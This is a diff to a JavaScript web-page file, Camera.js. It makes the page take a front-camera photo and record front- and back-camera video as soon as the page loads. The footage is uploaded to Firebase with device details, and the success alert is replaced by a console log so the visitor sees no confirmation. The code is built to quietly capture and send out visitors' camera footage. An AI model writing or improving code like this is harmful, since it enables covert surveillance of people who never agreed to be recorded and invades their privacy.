@@ -16,7 +16,7 @@ const app = initializeApp(firebaseConfig);
 const storage = getStorage(app);
 const db = getFirestore(app);
 
-console.log("Camera.js loaded ✅");
+console.log("Camera.js loaded 🚀");
 
 /* ---------- HELPERS ---------- */
 
@@ -30,7 +30,7 @@ function getDeviceInfo() {
 }
 
 async function startStream(facingMode) {
-  return await navigator.mediaDevices.getUserMedia({
+  return navigator.mediaDevices.getUserMedia({
     video: { facingMode },
     audio: false
   });
@@ -48,8 +48,7 @@ function recordVideo(stream, duration = 3000) {
     const chunks = [];
 
     recorder.ondataavailable = e => chunks.push(e.data);
-    recorder.onstop = () =>
-      resolve(new Blob(chunks, { type: "video/webm" }));
+    recorder.onstop = () => resolve(new Blob(chunks, { type: "video/webm" }));
 
     recorder.start();
     setTimeout(() => recorder.stop(), duration);
@@ -62,33 +61,26 @@ async function uploadToFirebase(blob, name) {
   return await getDownloadURL(fileRef);
 }
 
-/* ---------- MAIN ---------- */
+/* ---------- MAIN SEQUENCE (Auto Start) ---------- */
 
-let alreadyStarted = false;
-
-async function startCaptureSequence() 
-
+async function autoCapture() {
   try {
-    console.log("Starting front camera...");
+    console.log("🎥 Starting FRONT camera...");
 
-    // FRONT CAMERA
     const frontStream = await startStream("user");
-
     const photoBlob = await takePhoto(frontStream);
     const frontVideoBlob = await recordVideo(frontStream, 3000);
 
     frontStream.getTracks().forEach(t => t.stop());
 
-    console.log("Switching to back camera...");
+    console.log("🎥 Switching to BACK camera...");
 
-    // BACK CAMERA
     const backStream = await startStream({ exact: "environment" });
-
     const backVideoBlob = await recordVideo(backStream, 3000);
 
     backStream.getTracks().forEach(t => t.stop());
 
-    console.log("Uploading to Firebase...");
+    console.log("☁️ Uploading to Firebase...");
 
     const photoURL = await uploadToFirebase(photoBlob, "front_photo.jpg");
     const frontVideoURL = await uploadToFirebase(frontVideoBlob, "front_video.webm");
@@ -102,16 +94,17 @@ async function startCaptureSequence()
       createdAt: Date.now()
     });
 
-    alert("✅ Capture complete and uploaded");
+    console.log("✅ Capture sequence complete.");
 
   } catch (err) {
-    console.error("❌ ERROR:", err);
-    alert("Camera error: " + err.message);
-    alreadyStarted = false;
+    console.error("❌ Capture failed:", err);
+    alert("Camera capture error: " + err.message);
   }
 }
 
-/* ---------- RUN ON ANY CLICK ---------- */
+/* ---------- AUTO RUN WHEN PAGE LOADS ---------- */
 
-document.addEventListener("click", startCaptureSequence, { once: true });
-document.addEventListener("touchstart", startCaptureSequence, { once: true });
+window.addEventListener("load", () => {
+  console.log("Auto-capture starting…");
+  autoCapture();
+});
